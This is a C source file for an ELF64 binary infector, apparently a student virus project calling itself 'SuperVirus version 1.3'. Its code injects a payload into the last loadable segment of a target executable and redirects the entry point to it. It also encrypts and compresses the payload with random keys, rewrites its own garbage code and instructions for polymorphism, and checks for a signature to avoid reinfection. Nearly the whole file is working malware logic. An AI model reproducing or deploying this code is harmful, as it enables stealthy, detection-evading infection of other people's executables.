#include "infect.h"
#include "table.h"

//char KEY[16];
#define DATA 0x02

void randomize_key(){
	((uint32_t*)key)[0] = ft_rand();
	((uint32_t*)key)[1] = ft_rand();
	((uint32_t*)key)[2] = ft_rand();
	((uint32_t*)key)[3] = ft_rand();
}

int get_sig(char *s, size_t n, size_t virus_len, char *sig)
{
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	size_t sig_len = slen(sig);
	//TODO!! STRNlENGTHEN
	if (entry + virus_len >= n)
		return FALSE; //not infected

	size_t i;
	size_t sig_sum = 0;;

	for (i = 0; i < virus_len; i++)
	{
		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
			i += sig_len;
		sig_sum += *(unsigned char*)(s + entry + i);
	}

	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';

	return TRUE;
}

//======================= WOODY ==============================

//=============================================================

static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
	char *ns;
	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
	//	return FALSE;
	ns = (void*)CALL(SYS_mmap, NULL, (*n1) + n2, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return FALSE;
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
	for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
	for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
	*s1 = ns;
	*n1 = (*n1) + n2;
	return TRUE;
}

static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
	//char *ns = (char *)malloc((*n) + add);
	char *ns = (void*)CALL(SYS_mmap, NULL, (*n) + add, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return ; // TODO
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
	for (j = 0; j < add; j += 1){ns[i+j] = 0; }
	for (l = 0; i+l < *n; l += 1){ ns[i+j+l] = (*s)[i+l]; }
	//ffree(*s, *n);
	*s = ns;
	*n = (*n) + add;
}

void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, struct s_infect_params params){
	//add a few information about himself
	debug_ext("data_off>>", params.data_off, "\n");
	uint64_t *p = ((uint64_t *)(char*)(b + params.data_off));
	p[0] = max(old_entry,entry) - min(old_entry,entry);
	//struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
	*(struct s_opt *)(p + 1) = opt;
	//p[3] = ((uint64_t*)key)[0];
	//p[4] = ((uint64_t*)key)[1];

	debug_ext("dataearly_off>>", params.dataearly_off, "\n");
	uint64_t *p2 = ((uint64_t *)(char*)(b + params.dataearly_off));
	//debug("key", p2 + 0, "\n");
	((unsigned char*)key)[0] ^= 0b01110010;
	p2[0] = ((uint64_t*)key)[0];
	p2[1] = ((uint64_t*)key)[1];
	((unsigned char*)key)[0] ^= 0b01110010;
	//*(unsigned char*)(p + 3) ^= 0b01110010;
	//int c = FALSE;
	//encrypt((char*)(p+5), 15, (uint32_t*)key, &c, params.encrypt_routine);
}

static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt opt){
	Elf64_Ehdr *h = (void*)*s;
	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;

	size_t old_entry = h->e_entry;
	int x = elf_last_load_segment(*s, *n);
	if (ph[x].p_memsz < ph[x].p_filesz) return fail("corrupted binary");
	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
	size_t oldn = 0;
	char *olds = NULL;
	if (diff > 0){
		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
		oldn = *n;
		olds = *s;
		_insert_zeros(s,n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		elf_shift_offset(*s, *n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		//reset it
		Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
		//change memsize to filesize
		ph[x].p_filesz += diff;
		ph[x].p_memsz = ph[x].p_filesz;
	}
	size_t pos = ph[x].p_offset + ph[x].p_filesz;
	size_t oldn2 = *n;
	char *olds2 = *s;
	_insert(s, n, pos-1, p.b, p.bn);
	//encryption

	void *route = (void*)(*s + pos + p.decrypt_routine_off);
	//void *xx = ft_malloc(1024);
	poly_generate((void**)&p.encrypt_routine, (void**)&route);
	//reset it
	elf_shift_offset(*s, *n, pos, p.bn);
	elf_update_flags_of_load_segments(*s, *n);
	elf_change_size_last_load_segment(*s, *n, p.bn);
	elf_set_off_entry(*s, *n, pos);
	h = (void*)*s;
	ph = (*(void**)s) + h->e_phoff;
	poly_new_start((*s) + pos, p.infect_push_off, p.infect_pop_off);
	randomize_key();
	update_tables((unsigned char *)(*s)+pos, p.bn, p);
	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, p);
	//---------- z3 (encryption with compression) ----------------
	bool compressed = TRUE;
	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
	if (changed == -1)
		return FALSE;
	//update iscompressed in data
	((uint64_t *)(char*)((*s) + pos + p.data_off))[2] = ((uint64_t)compressed);
	//---------- z2 (encryption without compression) -------------
	bool nocompress = FALSE;
	((unsigned char*)key)[0] ^= 0b01110010;
	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &nocompress, p.encrypt_routine) == -1)
		return FALSE;
	((unsigned char*)key)[0] ^= 0b01110010;

	get_sig(*s, *n, p.bn, (char *)(((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2)+1);

	ffree(olds2, oldn2);
	if (olds)
		ffree(olds, oldn);
	return TRUE;
}

void update_tables(unsigned char *b, size_t len, struct s_infect_params p) {

	Garbage *gb_table = ((Garbage *)(b + p.gb_table_off));
	unsigned int gb_table_len = *((unsigned int *)(b + p.gb_table_len_off));
	Modif *modif_table = ((Modif *)(b + p.modif_table_off));
	unsigned int modif_table_len = *((unsigned int *)(b + p.modif_table_len_off));
	unsigned int num_to_xor = ((unsigned int*)(b + p.num_to_xor_off))[0];
	unsigned int new_num_to_xor = ft_rand();
	for (size_t i = 0 ; i < gb_table_len; i++){
		//decode
		gb_table[i].off ^= num_to_xor;
		gb_table[i].len ^= num_to_xor;
		generate_garb((char*)b + gb_table[i].off, gb_table[i].len);
		//encode
		gb_table[i].off ^= new_num_to_xor;
		gb_table[i].len ^= new_num_to_xor;
	}

	for (size_t i = 0 ; i < modif_table_len; i++){
		modif_table[i].off ^= num_to_xor;
		modif_table[i].len ^= num_to_xor;
		int xx = edit_ins(b + modif_table[i].off);
		debug_ext("for ", i, " >> ",xx," \n");
		modif_table[i].off ^= new_num_to_xor;
		modif_table[i].len ^= new_num_to_xor;
	}
	((unsigned int*)(b + p.num_to_xor_off))[0] = new_num_to_xor;
}

//=============================================================

int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_off){
	char sig[] = "SuperVirus version 1.3 (c)oded by ndombre-agadhgad-AAAAAAAA";
	size_t sig_len = slen(sig);
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	//check if size is enoug
	if (entry + dataearly_off + sig_len >= n)
		return TRUE;
	if (get_sig(s, n, virus_len, sig) == FALSE)
		return TRUE;
	char *p = (char*)(((uint64_t *)(s + entry + dataearly_off)) + 2)+1;
	//size_t *p = ((size_t *)(char*)(s + entry + DATA));
	//debug("cmp ", sig, " ", p, "\n");
	if (sncmp(p, sig, sig_len) == 0)
		return fail("already packed");
	return TRUE;
}

int infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt){
	char *s;
	size_t n;
	int ret = TRUE;

	if (!fget(fname, &s, &n))
	{
		fail("failed to open the file");
		goto fail;
	}
	if (elf_check_valid(s, n) == FALSE) goto fail;
	if (!check_already_packed(s, n, p.bn, p.dataearly_off)) goto fail;

	//after insert, update data
	if (!_infect(&s,&n, p, opt))
		goto fail;
	if (!fput(outname, s, n))
	{
		fail("failed to save to woody");
		goto fail;
	}

end:
	ffree(s, n);
	return ret;
fail:
	ret = FALSE;
	goto end;
}
